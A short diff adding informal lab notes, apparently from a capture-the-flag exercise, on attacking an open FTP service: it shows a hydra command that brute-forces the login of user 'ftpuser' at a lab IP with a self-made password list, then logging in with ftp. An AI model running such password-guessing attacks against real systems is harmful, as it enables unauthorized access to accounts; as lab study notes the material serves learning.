@@ -1,0 +1,15 @@
+FTP 
+
+FTP 21 - open 
+
+hydra -l ftpuser -P ftp_User_Password.txt ftp://10.10.209.159
+
+
+
+ftpuser- was the username
+
+ftp_user_password - passwrod list i created
+
+to use user and password 
+
+use - ftp <iptarget>
